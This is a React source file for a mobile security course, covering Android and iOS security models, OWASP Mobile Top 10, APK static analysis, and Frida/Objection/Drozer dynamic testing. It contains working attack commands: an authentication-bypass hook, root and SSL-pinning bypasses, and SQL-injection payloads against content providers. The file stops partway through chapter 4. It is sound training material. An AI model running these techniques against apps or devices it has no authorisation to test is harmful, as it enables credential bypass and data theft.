'use client'
import React from 'react'
import Link from 'next/link'
import ModuleCodex, { CodexChapter } from '../../components/ModuleCodex'

const accent = '#7c4dff'
const mono = 'JetBrains Mono, monospace'

const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: mono, fontSize: '9px', color: '#5a3a8a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#040208', border: '1px solid #200040', borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: accent, fontFamily: mono, fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)
const H3 = ({ children }: { children: React.ReactNode }) => (
  <h3 style={{ fontFamily: mono, fontSize: '0.85rem', fontWeight: 600, color: '#9966ff', marginTop: '1.75rem', marginBottom: '0.6rem' }}>&#9658; {children}</h3>
)
const P = ({ children }: { children: React.ReactNode }) => (
  <p style={{ color: '#9a8ab0', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.88rem' }}>{children}</p>
)
const Note = ({ type = 'info', children }: { type?: 'info' | 'warn' | 'danger' | 'tip'; children: React.ReactNode }) => {
  const cfg: Record<string, [string, string]> = {
    info:   ['#7c4dff', 'NOTE'],
    warn:   ['#ffb347', 'WARNING'],
    danger: ['#ff4136', 'CRITICAL'],
    tip:    ['#00ff41', 'PRO TIP'],
  }
  const [c, lbl] = cfg[type]
  return (
    <div style={{ background: c + '08', border: '1px solid ' + c + '33', borderLeft: '3px solid ' + c, borderRadius: '0 4px 4px 0', padding: '1rem 1.25rem', margin: '1.25rem 0' }}>
      <div style={{ fontFamily: mono, fontSize: '9px', color: c, letterSpacing: '0.2em', marginBottom: '6px' }}>{lbl}</div>
      <div style={{ color: '#8a8aaa', fontSize: '0.83rem', lineHeight: 1.7 }}>{children}</div>
    </div>
  )
}
const Table = ({ headers, rows }: { headers: string[]; rows: string[][] }) => (
  <div style={{ overflowX: 'auto', margin: '1rem 0 1.5rem' }}>
    <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: mono, fontSize: '0.75rem' }}>
      <thead>
        <tr style={{ borderBottom: '1px solid #200040' }}>
          {headers.map((h, i) => <th key={i} style={{ textAlign: 'left', padding: '8px 12px', color: '#9966ff', fontWeight: 600, letterSpacing: '0.1em', fontSize: '0.7rem' }}>{h}</th>)}
        </tr>
      </thead>
      <tbody>
        {rows.map((row, i) => (
          <tr key={i} style={{ borderBottom: '1px solid #110022', background: i % 2 === 0 ? 'transparent' : 'rgba(124,77,255,0.015)' }}>
            {row.map((cell, j) => <td key={j} style={{ padding: '8px 12px', color: '#8a8aaa', verticalAlign: 'top' }}>{cell}</td>)}
          </tr>
        ))}
      </tbody>
    </table>
  </div>
)

const chapters: CodexChapter[] = [
  // ─── CHAPTER 1 ───────────────────────────────────────────────────────────────
  {
    id: 'mob-01',
    title: 'Mobile Security Fundamentals',
    difficulty: 'BEGINNER',
    readTime: '14 min',
    labLink: '/modules/mobile-security/lab',
    takeaways: [
      'Android uses a Linux UID-per-app sandbox enforced by SELinux; iOS uses hardware-backed Secure Enclave and entitlement-gated sandboxing',
      'OWASP Mobile Top 10 (2024) replaces the 2016 list - M1 is now Improper Credential Usage rather than Weak Server Side Controls',
      'MASVS defines two verification levels (L1 standard, L2 defence-in-depth) plus Resilience (R) for anti-tampering requirements',
      'The mobile threat landscape is dominated by commercial spyware (Pegasus, Predator), banking trojans, and stalkerware targeting domestic abuse victims',
      'Legal note: accessing a mobile device without explicit written consent violates the CFAA in the US and equivalent laws globally - always get authorisation',
    ],
    content: (
      <div>
        <P>Mobile security is one of the fastest-evolving domains in offensive and defensive security. Two platforms dominate: Android (roughly 72% global market share) and iOS. While both are hardened, both are regularly broken. Understanding their security models is the prerequisite for everything that follows in this module.</P>

        <H3>Android Security Model</H3>
        <P>Android is built on a modified Linux kernel. Its isolation model is deceptively simple: every installed application gets its own Linux user ID (UID). The OS then enforces process isolation at the kernel level - app A literally cannot read app B's files because the filesystem permissions deny access at the UID level. This is called the application sandbox.</P>
        <Table
          headers={['Layer', 'Component', 'Security Role']}
          rows={[
            ['Linux Kernel', 'Process management, UID isolation, seccomp filters', 'Foundation of app sandboxing'],
            ['HAL', 'Hardware Abstraction Layer', 'Isolates driver code from Android framework'],
            ['Android Runtime', 'ART (ahead-of-time compiled DEX bytecode)', 'Runs app code; isolated per-process'],
            ['Framework', 'Activity Manager, Package Manager, Binder IPC', 'Enforces permissions, manages inter-app communication'],
            ['Applications', 'System apps + third-party APKs', 'Runs in sandbox, requests permissions'],
          ]}
        />
        <P>SELinux (Security-Enhanced Linux) runs in Enforcing mode on all modern Android devices. It implements mandatory access control (MAC) on top of the standard Linux DAC (discretionary access control). Even if an attacker gains a UID, SELinux policy may still block access to sensitive resources. Bypassing SELinux policy is a significant escalation primitive - it's what separates a limited root from a full root.</P>
        <P>The Android permission model has evolved significantly. Dangerous permissions (camera, location, contacts) must be requested at runtime since Android 6.0. Users can revoke them individually. However, the permission model only governs what the app can do - it doesn't prevent the app from using those permissions maliciously once granted.</P>

        <H3>iOS Security Model</H3>
        <P>iOS takes a fundamentally different approach. Rather than relying purely on software isolation, Apple's security model is deeply hardware-rooted. The Secure Enclave is a dedicated security processor (present from iPhone 5S onwards) that handles cryptographic operations independently of the main application processor. Biometric data (Face ID, Touch ID templates) never leave the Secure Enclave - not even the OS kernel can access them.</P>
        <P>Code signing is mandatory. Every executable that runs on iOS must be signed by an Apple-trusted certificate. The kernel verifies signatures at load time. This prevents unsigned code from executing - a critical control that makes "just run a binary" impossible without either a developer certificate or a kernel exploit (jailbreak). Entitlements are a plist embedded in the signed binary that declare exactly what capabilities the app is allowed to use. Without the entitlement, the API call fails regardless of sandbox state.</P>
        <Table
          headers={['iOS Layer', 'Components']}
          rows={[
            ['Cocoa Touch', 'UIKit, Foundation, app frameworks - what developers interact with'],
            ['Media Layer', 'AVFoundation, Core Graphics, OpenGL - media processing'],
            ['Core Services', 'Core Data, CFNetwork, Security.framework - system services'],
            ['Core OS', 'Kernel, file system, networking, Bluetooth, Wi-Fi'],
          ]}
        />

        <H3>OWASP Mobile Top 10 (2024)</H3>
        <Pre label="// OWASP MOBILE TOP 10 — 2024 EDITION">{`M1  Improper Credential Usage
    Hardcoded credentials, insecure storage, weak key management
    Example: API key in strings.xml or hardcoded in APK assets

M2  Inadequate Supply Chain Security
    Malicious third-party SDKs, vulnerable dependencies, poisoned build pipeline
    Example: Xcode Ghost campaign infected iOS builds via malicious Xcode copy

M3  Insecure Authentication / Authorization
    Broken auth logic, missing token validation, improper session management
    Example: JWT accepted without signature verification on mobile backend

M4  Insufficient Input/Output Validation
    SQL injection in content providers, XSS in WebView, intent injection
    Example: content://PROVIDER_URI?id=1 OR 1=1-- returns all records

M5  Insecure Communication
    Cleartext HTTP, weak TLS config, missing certificate pinning
    Example: NetworkSecurityConfig allows cleartext for all domains

M6  Inadequate Privacy Controls
    Over-collection of PII, insecure data sharing, analytics SDK leakage
    Example: third-party analytics SDK exfiltrates IMEI, GPS, contacts

M7  Insufficient Binary Protections
    No obfuscation, missing anti-tampering, no root/jailbreak detection
    Example: credentials extracted in 30s because ProGuard disabled

M8  Security Misconfiguration
    Debuggable flag, exported components, backup flag, test endpoints
    Example: android:debuggable="true" in production release

M9  Insecure Data Storage
    World-readable SharedPreferences, cleartext SQLite, external storage
    Example: /sdcard/myapp/tokens.txt readable by any app (pre-Android 10)

M10 Insufficient Cryptography
    Custom crypto, ECB mode, weak keys, reuse of IVs, MD5 for passwords
    Example: AES-ECB used for user data - same plaintext = same ciphertext`}</Pre>

        <H3>MASTG and MASVS</H3>
        <P>The OWASP Mobile Application Security Testing Guide (MASTG) is the definitive methodology for mobile app security testing. It covers both Android and iOS, structured as test cases mapped to MASVS controls. Think of MASTG as "how to test" and MASVS as "what to test against."</P>
        <P>The Mobile Application Security Verification Standard (MASVS) defines three levels: L1 (baseline security, all apps should pass), L2 (defence-in-depth, for apps handling sensitive data like banking or healthcare), and R (Resilience, for apps that need to resist reverse engineering and tampering, like DRM or payment apps).</P>

        <H3>Mobile Threat Landscape</H3>
        <P>Commercial spyware represents the apex of the mobile threat spectrum. Pegasus (NSO Group) and Predator (Cytrox/Intellexa) are zero-click exploit chains that can silently compromise fully patched iPhones and Android devices. They exploit memory corruption vulnerabilities in image parsers, PDF renderers, or network stacks to achieve code execution without any user interaction. Once installed, they exfiltrate messages, calls, location, and can activate mic/camera.</P>
        <P>Banking trojans (Cerberus, Anubis, SOVA, SharkBot) target Android because sideloading is possible. They use overlay attacks to steal credentials, abuse Accessibility Services to read screen content, and intercept SMS OTPs. Stalkerware is commercially available spyware marketed for "parental control" or "employee monitoring" but systematically abused in intimate partner violence contexts.</P>

        <H3>Mobile Bug Bounty</H3>
        <Table
          headers={['Program', 'Platform', 'Focus Areas', 'Notable Payouts']}
          rows={[
            ['Google VRP', 'Android, Chrome, Pixel', 'OS vulnerabilities, app security', 'Up to $1.5M for full chain'],
            ['Apple Security Bounty', 'iOS, macOS, iCloud', 'Kernel, bootchain, iCloud bypass', 'Up to $2M for zero-click kernel'],
            ['HackerOne programs', 'Various Android/iOS apps', 'App-level vulnerabilities', 'Varies by company'],
            ['Bugcrowd programs', 'Various Android/iOS apps', 'OWASP Mobile Top 10 classes', 'Varies by company'],
          ]}
        />

        <Note type="danger">Legal note: accessing another person's mobile device - even to test an app - without explicit written consent is a criminal offence in virtually every jurisdiction. In the US this triggers the Computer Fraud and Abuse Act (CFAA). Always have a signed scope agreement, test only on devices and accounts you own or have explicit permission to test.</Note>
      </div>
    ),
  },

  // ─── CHAPTER 2 ───────────────────────────────────────────────────────────────
  {
    id: 'mob-02',
    title: 'Android Static Analysis',
    difficulty: 'INTERMEDIATE',
    readTime: '16 min',
    labLink: '/modules/mobile-security/lab',
    takeaways: [
      'An APK is a ZIP file - rename it .zip and extract with unzip to see all raw components including AndroidManifest.xml (binary encoded), DEX files, and native libs',
      'apktool decodes to human-readable Smali; jadx decompiles to readable Java source - use both together for full coverage',
      'android:debuggable="true" and android:allowBackup="true" in production manifests are critical findings - report them',
      'Hardcoded secrets hunt: search for API_KEY, secret, password, token in all .java .xml .smali .json .properties files recursively',
      'MobSF automates 80% of static analysis in minutes - run it first, then do manual review on flagged areas',
    ],
    content: (
      <div>
        <P>Static analysis means examining an app without running it. For Android, this means extracting and inspecting the APK. You will find architectural weaknesses, hardcoded secrets, dangerous API usage, and misconfigurations without ever needing a device.</P>

        <H3>APK Structure</H3>
        <P>An APK (Android Package) is simply a ZIP archive with a specific internal structure. Every component is accessible once you unzip it. Understanding what each component is for is essential to knowing where to look for vulnerabilities.</P>
        <Pre label="// APK INTERNAL STRUCTURE">{`APK_NAME.apk (rename to .zip, then unzip)
|
|-- AndroidManifest.xml       # Binary-encoded XML: permissions, components, flags
|-- classes.dex               # Compiled Dalvik bytecode (primary code)
|-- classes2.dex              # Multidex overflow (large apps)
|-- resources.arsc            # Compiled resource table (binary)
|-- lib/
|   |-- armeabi-v7a/          # 32-bit ARM native libraries (.so files)
|   |-- arm64-v8a/            # 64-bit ARM native libraries
|   |-- x86/ x86_64/          # Intel emulator/device libs
|-- assets/                   # Raw files bundled with app (check for secrets!)
|-- res/
|   |-- layout/               # XML layouts
|   |-- values/               # strings.xml, colors.xml, etc.
|   |-- raw/                  # Raw assets (certificates, configs)
|-- META-INF/
    |-- MANIFEST.MF           # File hashes
    |-- CERT.RSA / CERT.SF    # App signature`}</Pre>

        <H3>AndroidManifest.xml Analysis</H3>
        <P>The manifest is the most important file for static analysis. It declares every component, every permission the app requests, and critical security flags. apktool decodes it to human-readable XML.</P>
        <Pre label="// KEY MANIFEST FLAGS TO CHECK">{`# CRITICAL: debuggable in production = attach debugger, dump memory, bypass checks
android:debuggable="true"

# CRITICAL: backup allows adb backup extraction of app data even on non-rooted device
android:allowBackup="true"

# Exported activity = any app on device can launch it (may bypass auth)
<activity android:name=".AdminActivity" android:exported="true" />

# Exported content provider = any app can query/insert data
<provider android:name=".DataProvider" android:exported="true" />

# Deep link scheme - check for intent injection and open redirect
<intent-filter>
    <data android:scheme="myapp" android:host="action" />
</intent-filter>

# Permissions declared (check for overprivilege)
<uses-permission android:name="android.permission.READ_CONTACTS" />
<uses-permission android:name="android.permission.SEND_SMS" />
<uses-permission android:name="android.permission.RECORD_AUDIO" />`}</Pre>

        <H3>APK Extraction Methods</H3>
        <Pre label="// EXTRACTING APKs">{`# Method 1: ADB pull from installed app
adb shell pm list packages | grep TARGET_APP
adb shell pm path com.target.app
# Returns something like: package:/data/app/com.target.app-1.apk
adb pull /data/app/com.target.app-1.apk ./target.apk

# Method 2: APKPure (third-party store, use for research only)
# https://apkpure.com - search, download APK directly

# Method 3: Evozi APK Downloader (fetches direct from Google Play CDN)
# https://apps.evozi.com/apk-downloader

# Method 4: gplaydl / gplaycli (command line)
pip install gplaycli
gplaycli -d com.target.app -f ./`}</Pre>

        <H3>apktool - Decompile to Smali</H3>
        <Pre label="// APKTOOL USAGE">{`# Install
sudo apt install apktool
# or download jar: https://apktool.org

# Decompile APK to Smali + decoded resources
apktool d TARGET.apk -o ./output_dir

# Output structure after decompile:
# output_dir/AndroidManifest.xml  (decoded, human readable)
# output_dir/smali/               (Smali bytecode - like assembly for Dalvik)
# output_dir/res/                 (decoded XML resources)

# Rebuild APK after modification (e.g. patching SSL pinning)
apktool b ./output_dir -o patched.apk

# Sign the rebuilt APK before installing
keytool -genkey -v -keystore test.keystore -alias alias_name \
  -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
  -keystore test.keystore patched.apk alias_name
zipalign -v 4 patched.apk patched_aligned.apk

# Install patched APK
adb install patched_aligned.apk`}</Pre>

        <H3>jadx - Decompile to Java</H3>
        <Pre label="// JADX DECOMPILE TO JAVA SOURCE">{`# Install jadx
sudo apt install jadx
# or from: https://github.com/skylot/jadx/releases

# Command line: decompile to Java source files
jadx -d ./java_output TARGET.apk

# GUI: much easier for navigation and searching
jadx-gui TARGET.apk

# In jadx-gui:
# - Navigation tree on left: packages -> classes -> methods
# - Search (Ctrl+F): search across all decompiled code
# - Find Usage: right-click any class/method
# - Text search (Ctrl+Shift+F): search across all strings/code
# - Resources tab: view decoded AndroidManifest, layouts, strings

# Useful jadx flags
jadx --deobf TARGET.apk -d ./output    # Enable deobfuscation
jadx --export-gradle TARGET.apk -d ./  # Export as Gradle project`}</Pre>

        <H3>dex2jar + jd-gui Workflow</H3>
        <Pre label="// ALTERNATIVE: DEX2JAR + JD-GUI">{`# Convert DEX bytecode to JAR
d2j-dex2jar TARGET.apk -o TARGET.jar

# Open JAR in JD-GUI (Java Decompiler GUI)
jd-gui TARGET.jar

# Note: jadx generally produces better output than jd-gui
# Use dex2jar+jd-gui as a fallback when jadx fails on specific classes`}</Pre>

        <H3>Hunting Hardcoded Secrets</H3>
        <Pre label="// SECRET HUNTING IN DECOMPILED SOURCE">{`# After jadx decompile, search recursively
cd ./java_output

# Search for API keys, tokens, credentials
grep -ri "api_key\|apikey\|api-key" . --include="*.java"
grep -ri "secret\|password\|passwd\|token" . --include="*.java"
grep -ri "aws_access\|AKIA\|client_secret" . --include="*.java"

# Search in resources too
grep -ri "key\|secret\|password" ../res/ --include="*.xml"

# APKLeaks automates this entire process
pip install apkleaks
apkleaks -f TARGET.apk -o leaks.json

# Common finding locations:
# - BuildConfig.java (build-time injected constants)
# - NetworkConfig.java or similar (base URLs, API endpoints)
# - strings.xml in res/values/
# - assets/*.json, assets/*.properties, assets/*.config
# - hardcoded in method bodies (worst practice)`}</Pre>

        <H3>Obfuscation Analysis</H3>
        <P>ProGuard (included in Android build tools), R8 (Google's replacement), and DexGuard (commercial, Guardsquare) are used to obfuscate APKs. ProGuard renames classes to a, b, c etc. R8 does the same with more aggressive optimisation. DexGuard adds string encryption, class encryption, and anti-tamper checks.</P>
        <Pre label="// RECOGNISING AND HANDLING OBFUSCATION">{`# Heavily obfuscated class names look like:
# com.example.a.b.c instead of com.example.LoginActivity

# jadx has built-in deobfuscation - try it first
jadx --deobf TARGET.apk -d ./output

# For string encryption (DexGuard), use Frida to intercept at runtime
# Hook the decryption method when it's called and log the result

# Find ProGuard mapping file if available (in build artifacts)
# mapping.txt maps obfuscated names back to originals

# Practical tip: look for methods that take a String and return a String
# near startup code - these are often string decryption routines`}</Pre>

        <H3>Native Library Analysis</H3>
        <Pre label="// ANALYZING .so NATIVE LIBRARIES">{`# List exported symbols from native lib
nm -D lib/arm64-v8a/libnative.so | grep " T "

# Disassemble with objdump
objdump -d lib/arm64-v8a/libnative.so | head -100

# Full reverse engineering with Ghidra (free, NSA tool)
# 1. Open Ghidra, create project, import .so file
# 2. Select ARM/AARCH64 architecture
# 3. Auto-analyze
# 4. Decompiler view gives C-like pseudocode
# 5. Look for: crypto operations, network code, anti-debug checks

# strings extraction from native lib
strings lib/arm64-v8a/libnative.so | grep -i "http\|key\|pass\|secret"`}</Pre>

        <H3>MobSF Automated Static Analysis</H3>
        <Pre label="// MOBSF SETUP AND USAGE">{`# Install MobSF with Docker (easiest)
docker pull opensecurity/mobile-security-framework-mobsf
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf

# Access web interface at http://localhost:8000
# Default creds: mobsf / mobsf

# Usage:
# 1. Upload APK via web interface
# 2. MobSF auto-runs: manifest analysis, permission analysis,
#    hardcoded secret detection, code analysis, binary analysis
# 3. Review the score and each finding category
# 4. Download PDF report for client deliverables

# MobSF via API (for automation)
curl -F "file=@TARGET.apk" http://localhost:8000/api/v1/upload \
  -H "Authorization: MOBSF_API_KEY"

# Key MobSF output sections:
# - Security Score (0-100, lower is worse)
# - Manifest Analysis: exported components, dangerous flags
# - Code Analysis: hardcoded secrets, dangerous API usage
# - Binary Analysis: permissions vs usage, libraries
# - Domain Malware Check: URLs in APK checked against threat feeds`}</Pre>

        <Note type="tip">QARK (Quick Android Review Kit) by LinkedIn is another static analysis tool worth knowing. Run: pip install qark then qark --apk /path/to/TARGET.apk --report-type html. It generates an HTML report similar to MobSF but is more lightweight.</Note>
      </div>
    ),
  },

  // ─── CHAPTER 3 ───────────────────────────────────────────────────────────────
  {
    id: 'mob-03',
    title: 'Android Dynamic Analysis & Runtime Manipulation',
    difficulty: 'INTERMEDIATE',
    readTime: '18 min',
    labLink: '/modules/mobile-security/lab',
    takeaways: [
      'ADB is the primary interface for Android testing - master adb shell, logcat, forward, and the activity manager (am) and package manager (pm) commands',
      'Frida is the industry-standard dynamic instrumentation framework - frida-server runs on the device, your scripts run on the host and inject into the target process',
      'Objection wraps Frida with ready-made mobile security commands - start here before writing custom Frida scripts',
      'SSL pinning bypass via objection is a single command: android sslpinning disable - if it fails, escalate to Frida Universal SSL Bypass script',
      'Always analyse logcat immediately after launching a target app - developers routinely log sensitive data in debug builds',
    ],
    content: (
      <div>
        <P>Dynamic analysis means running the app and observing its behaviour at runtime. This lets you bypass compile-time obfuscation, intercept live network traffic, dump memory, hook function calls, and test how the app behaves under adversarial input.</P>

        <H3>Android Debug Bridge (ADB) Complete Reference</H3>
        <Pre label="// ADB ESSENTIAL COMMANDS">{`# ---- Device Management ----
adb devices                          # List connected devices/emulators
adb devices -l                       # List with details
adb -s DEVICE_SERIAL shell           # Connect to specific device

# ---- Shell Access ----
adb shell                            # Interactive shell (no root)
adb shell su                         # Root shell (rooted device only)
adb shell id                         # Check current user

# ---- File Operations ----
adb push /local/path /sdcard/target  # Upload file to device
adb pull /sdcard/source /local/dest  # Download file from device
adb pull /data/data/com.target.app/  # Pull entire app data dir (needs root)

# ---- App Management ----
adb install TARGET.apk               # Install APK
adb install -r TARGET.apk            # Reinstall (keep data)
adb uninstall com.target.app         # Uninstall by package name
adb shell pm list packages           # List all installed packages
adb shell pm list packages -3        # Third-party apps only
adb shell pm path com.target.app     # Get APK path

# ---- Logcat ----
adb logcat                           # All logs (noisy)
adb logcat -s MyAppTag               # Filter by tag
adb logcat | grep -i "password\|token\|key\|secret"
adb logcat *:E                       # Error level only
adb logcat -c                        # Clear log buffer

# ---- Port Forwarding ----
adb forward tcp:8080 tcp:8080        # Forward host 8080 -> device 8080
adb reverse tcp:8080 tcp:8080        # Forward device 8080 -> host 8080

# ---- Activity Manager (am) ----
adb shell am start -n com.target.app/.MainActivity
adb shell am start -a android.intent.action.VIEW -d "myapp://secret_path"
adb shell am broadcast -a com.target.ACTION_TEST

# ---- Package Manager (pm) ----
adb shell pm grant com.target.app android.permission.READ_CONTACTS
adb shell pm revoke com.target.app android.permission.CAMERA`}</Pre>

        <H3>ADB over Network (TCP)</H3>
        <Pre label="// ADB TCP MODE">{`# Enable TCP mode from device (must be connected via USB first)
adb tcpip 5555

# Get device IP
adb shell ip addr show wlan0 | grep "inet "

# Connect over WiFi
adb connect DEVICE_IP:5555

# Verify
adb devices

# Disconnect
adb disconnect DEVICE_IP:5555`}</Pre>

        <H3>Emulator Setup</H3>
        <Pre label="// EMULATOR OPTIONS FOR TESTING">{`# Android Studio AVD (Android Virtual Device)
# Tools -> AVD Manager -> Create Virtual Device
# Choose: Pixel 6, API 33 (Android 13), x86_64 image
# IMPORTANT: Choose "Google APIs" image (has root via adb shell su)
# NOT "Google Play" image (locked down, no root)

# Launch AVD from command line
emulator -avd Pixel_6_API_33 -no-snapshot -writable-system

# Genymotion (faster, commercial, has free personal edition)
# https://www.genymotion.com
# Faster boot, better hardware simulation, built-in adb

# Android-x86 in VirtualBox (full PC install)
# Good for: persistent testing environment
# Download from: https://www.android-x86.org

# Tip: Always use a Google APIs (non-Play) AVD image for pentesting
# It supports: adb root, adb remount, writable /system`}</Pre>

        <H3>Root Detection and Bypass</H3>
        <Pre label="// ROOT BYPASS METHODS">{`# What apps check for (common root indicators):
# - Presence of /system/bin/su or /system/xbin/su
# - Packages: com.topjohnwu.magisk, com.noshufou.android.su, eu.chainfire.supersu
# - RootBeer library checks
# - SafetyNet / Play Integrity API attestation
# - Build tags: ro.build.tags=test-keys

# Magisk (current standard for rooting + hiding root)
# https://github.com/topjohnwu/Magisk
# Installs as a systemless root - modifies boot image not /system
# MagiskHide (legacy) / Zygisk-Assistant: hides root from specific apps

# Zygisk-Assistant (newer, Magisk module)
# Install via Magisk -> Modules -> Zygisk-Assistant
# Configure deny list: add your target app
# Magisk settings: enable Zygisk

# For emulator: patch AVD boot image with Magisk
# 1. Download Magisk APK, rename to .zip
# 2. Extract boot.img from AVD system image
# 3. Patch boot.img with Magisk app
# 4. Flash patched boot.img back

# Nuclear option: patch root detection in Smali/Java using apktool
# Find the isRooted() or checkRoot() method, replace return value with false`}</Pre>

        <H3>Frida Dynamic Instrumentation Framework</H3>
        <P>Frida is a world-class dynamic instrumentation toolkit that lets you inject JavaScript (or Python, C, Swift) into running processes to hook functions, modify behaviour, and dump data. It works on Android, iOS, Windows, macOS, and Linux.</P>
        <Pre label="// FRIDA SETUP ON ANDROID">{`# Host: install frida tools
pip install frida-tools

# Device: download frida-server matching your frida version and architecture
# https://github.com/frida/frida/releases
# File: frida-server-VERSION-android-arm64.xz (for 64-bit ARM)

xz -d frida-server-VERSION-android-arm64.xz
adb push frida-server-VERSION-android-arm64 /data/local/tmp/frida-server
adb shell chmod 755 /data/local/tmp/frida-server

# Run frida-server (needs root)
adb shell su -c "/data/local/tmp/frida-server &"

# Verify connection from host
frida-ps -U              # List processes on USB device
frida-ps -U -a           # Include app names
frida-ps -U | grep com.target.app

# Attach to running process
frida -U -n com.target.app`}</Pre>

        <Pre label="// FRIDA SCRIPTING - JAVA HOOKS">{`// Hook a Java method in Frida JavaScript API
Java.perform(function() {

  // Get reference to target class
  var LoginActivity = Java.use('com.target.app.LoginActivity');

  // Hook method - overload() needed if method is overloaded
  LoginActivity.checkPassword.overload('java.lang.String').implementation = function(password) {
    console.log('[+] checkPassword called with: ' + password);
    // Call original method and capture return value
    var result = this.checkPassword(password);
    console.log('[+] Original return: ' + result);
    // Force return true regardless of password
    return true;
  };

  // Hook constructor
  var MyClass = Java.use('com.target.app.MyClass');
  MyClass.$init.implementation = function(arg1, arg2) {
    console.log('[+] Constructor called: ' + arg1 + ', ' + arg2);
    this.$init(arg1, arg2);  // call original constructor
  };

  // Enumerate loaded classes matching pattern
  Java.enumerateLoadedClasses({
    onMatch: function(className) {
      if (className.includes('Pin') || className.includes('Cert')) {
        console.log('[*] Found: ' + className);
      }
    },
    onComplete: function() {}
  });

});`}</Pre>

        <Pre label="// RUN FRIDA SCRIPT">{`# Spawn app and inject script from startup
frida -U -f com.target.app --no-pause -l ./my_script.js

# Attach to already running process
frida -U -n com.target.app -l ./my_script.js

# Interactive REPL (great for exploration)
frida -U -n com.target.app
# Then type JavaScript at the > prompt`}</Pre>

        <H3>Objection - Runtime Mobile Exploration</H3>
        <P>Objection is built on top of Frida and provides a high-level command-line interface with pre-built mobile security testing commands. It's the right starting point before writing custom Frida scripts.</P>
        <Pre label="// OBJECTION USAGE">{`# Install
pip install objection

# Attach to running app
objection -g com.target.app explore

# Key Android commands inside objection REPL:
android sslpinning disable           # Bypass SSL certificate pinning
android root disable                  # Bypass root detection
android hooking list classes          # List all loaded classes
android hooking list class_methods com.target.LoginActivity
android hooking watch class com.target.LoginActivity
android hooking watch method com.target.LoginActivity.checkPin --dump-args --dump-return

android intent launch_activity com.target.app.HiddenActivity

# Filesystem and data
android filesystem ls /data/data/com.target.app/
android filesystem download /data/data/com.target.app/databases/main.db ./main.db

# Environment info
env                                   # App directories, files, data paths

# Memory
memory list modules
memory dump all ./memory_dump.bin
memory search "SECRET" --string`}</Pre>

        <H3>SSL Pinning Bypass</H3>
        <Pre label="// SSL PINNING BYPASS METHODS">{`# Method 1: Objection (easiest, works most of the time)
objection -g com.target.app explore
# then:
android sslpinning disable

# Method 2: Frida Universal SSL Bypass
# https://github.com/WooyunDota/DroidSSLUnpinning
frida -U -f com.target.app --no-pause \
  -l ./UniversalAndroidSSLUnpinning.js

# Method 3: Frida CodeShare community scripts
frida --codeshare akabe1/frida-multiple-unpinning \
  -U -f com.target.app --no-pause

# Method 4: Patch NetworkSecurityConfig (static - requires APK rebuild)
# In res/xml/network_security_config.xml, add:
# <trust-anchors>
#   <certificates src="system"/>
#   <certificates src="user"/>     <- add this line
# </trust-anchors>
# Then rebuild and sign with apktool

# Method 5: Certificate Store Patching (add Burp cert to system trust store)
# On rooted device:
openssl x509 -inform DER -in burp.der -out burp.pem
openssl x509 -inform PEM -subject_hash_old -in burp.pem
# rename to HASH.0 and copy to /system/etc/security/cacerts/
adb push HASH.0 /system/etc/security/cacerts/
adb shell chmod 644 /system/etc/security/cacerts/HASH.0`}</Pre>

        <H3>Network Traffic Interception with Burp Suite</H3>
        <Pre label="// BURP + ANDROID PROXY SETUP">{`# 1. Configure Burp proxy listener on 0.0.0.0:8080

# 2. Set proxy on Android device/emulator
# Settings -> WiFi -> Long press network -> Modify -> Manual Proxy
# Host: BURP_HOST_IP, Port: 8080

# 3. Download Burp certificate
# On device browser, go to: http://burpsuite/
# Download cert -> save as burp.der

# 4. Install certificate
adb push burp.der /sdcard/burp.der
# Settings -> Security -> Install from storage

# For Android 7+ (network security config enforcement):
# Either use the patching method above, or
# use objection/Frida SSL pinning bypass

# Verify traffic is flowing through Burp
adb shell curl -k https://httpbin.org/get --proxy http://BURP_HOST_IP:8080`}</Pre>

        <H3>Drozer Android Testing Framework</H3>
        <Pre label="// DROZER SETUP AND ATTACK COMMANDS">{`# Install Drozer console on host
pip install drozer

# Install Drozer agent APK on device
adb install drozer-agent.apk
# Start Drozer agent on device (enable server in app)

# Forward port and connect
adb forward tcp:31415 tcp:31415
drozer console connect

# ---- Inside Drozer Console ----

# List all packages
run app.package.list

# Package info
run app.package.info -a com.target.app

# List exported attack surface
run app.package.attacksurface com.target.app

# ---- Activities ----
run app.activity.info -a com.target.app
run app.activity.start --component com.target.app com.target.app.HiddenActivity

# ---- Content Providers ----
run app.provider.info -a com.target.app
run app.provider.finduri com.target.app
run app.provider.query content://com.target.app.provider/users
run app.provider.query content://com.target.app.provider/users --projection "* FROM users--"
run app.provider.insert content://com.target.app.provider/users \
  --string username admin --string password pwned

# ---- Broadcast Receivers ----
run app.broadcast.info -a com.target.app
run app.broadcast.send --action com.target.app.ACTION_ADMIN --extra string token bypass`}</Pre>

        <H3>Logcat Analysis for Data Leakage</H3>
        <Pre label="// LOGCAT SENSITIVE DATA HUNTING">{`# Filter for common sensitive patterns
adb logcat | grep -iE "password|token|secret|key|session|auth|pin|otp|credit|card"

# App-specific logs
adb logcat -s com.target.app

# Save to file for offline analysis
adb logcat -d > logcat_session.txt
grep -iE "password|apikey|Bearer" logcat_session.txt

# Note: release builds should have no sensitive logging
# but debug builds routinely leak credentials, tokens, PII
# Always run this at app startup, login, and during payments`}</Pre>

        <Note type="warn">Frida requires frida-server running as root on the device. If the device is not rooted, use Frida Gadget injection: repack the APK with the Gadget .so injected into a native lib load, sign it, and install. This works without root but requires APK repackaging.</Note>
      </div>
    ),
  },

  // ─── CHAPTER 4 ───────────────────────────────────────────────────────────────
  {
    id: 'mob-04',
    title: 'Android Vulnerability Classes',
    difficulty: 'ADVANCED',
    readTime: '17 min',
    labLink: '/modules/mobile-security/lab',
    takeaways: [
      'Insecure data storage is the most consistently found Android vulnerability - check SharedPreferences, SQLite, external storage, and logcat before anything else',
      'Exported content providers are an IPC attack surface equivalent to a web API without authentication - test all exported providers with Drozer',
      'WebView with addJavascriptInterface on API < 17 is remote code execution; even on modern APIs, improper WebView configuration can leak local files',
      'Deep link hijacking allows a malicious app to intercept navigation intents meant for the legitimate app - look for schemes in the manifest',
